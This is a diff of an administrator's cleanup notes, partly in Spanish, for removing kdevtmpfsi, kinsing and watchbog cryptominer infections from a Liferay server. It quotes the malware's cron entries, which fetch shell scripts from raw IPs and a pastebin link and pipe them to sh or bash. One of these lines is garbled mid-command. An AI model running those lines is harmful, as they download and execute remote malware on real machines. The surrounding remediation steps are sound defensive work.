@@ -1,16 +1,40 @@
-
-SOLO FUNCIONA SI SE LOGUEA POR MEDIO DE LA CONSOLA DE AMAZON SSH en el Web
+apt-get update
+apt-get upgrade
 
 crontab -e 
 
 # REMOVE A SIMILAR LINE TO THIS
 * * * * * wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1
+* * * * * wget -q -O - http://185.193.127.21/unk.sh | sh > /dev/null 2>&1
+*/11 * * * * sed -i '/pastebin.com/d' /etc/hosts; sed -i '/185.193.127.21/d' /etc/hosts; (curl -fsSL http://185.193.127.21/old.txt||wgeib2 as fbi;print fbi.urlopen("https://pastebin.com/raw/DZY2m4sv").read()')|bash
+
+
+Buscar IP
+	https://www.whatismyip.com/ip-address-lookup/
+
+Buscar Codigo del Pais
+	https://linuxconfig.org/redirect-or-block-traffic-based-on-geographical-location-apache-geoip-mod
+
+Block IP using guie "block IP's"
+	Buscar codigo del pais y agregarlo a la lista
 
 
 
+iptables -A INPUT --src 185.193.127.21 -j DROP
 
 
- iptables -A INPUT --src 195.3.146.118 -j DROP
+
+Stop liferay
+
+# Add the following line to portal-setup-wizard.properties
+nano portal-setup-wizard.properties
+jsonws.servlet.hosts.allowed=Not/Available
+
+
+iptables -A INPUT --src 195.3.146.118 -j DROP
+
+chmod 1777 /tmp
+chmod go-rwx /var/tmp
 
 
 chmod 000 /tmp/kdevtmpfsi
@@ -24,13 +48,19 @@ chattr -iR /var/tmp/kinsing
 touch /tmp/kdevtmpfsi && touch /var/tmp/kinsing
 echo "everything is good here" > /tmp/kdevtmpfsi
 echo "everything is good here" > /var/tmp/kinsing
+
+
 cat /tmp/kdevtmpfsi && cat /var/tmp/kinsing
 
-
-chmod go-rwx /var/tmp
 chmod 1777 /tmp
+chmod go-rwx /var/tmp
+
+
+for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done
 
 echo "root" > /etc/cron.allow
+
+for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done
 
 
 cd /opt/liferay/tomcat-9.0.17/bin
@@ -43,3 +73,21 @@ ps -ef | grep kdevtmpfsi
 kill -9 PROCESS_ID
 
 reboot now
+
+
+---------------------------------
+watchbog
+Block IP using guie "block IP's"
+
+
+crontab -e 
+
+# REMOVE A SIMILAR LINE TO THIS
+* * * * * wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1
+
+rm -r /usr/bin/watchbog
+rm -r /bin/watchbog
+
+
+
+
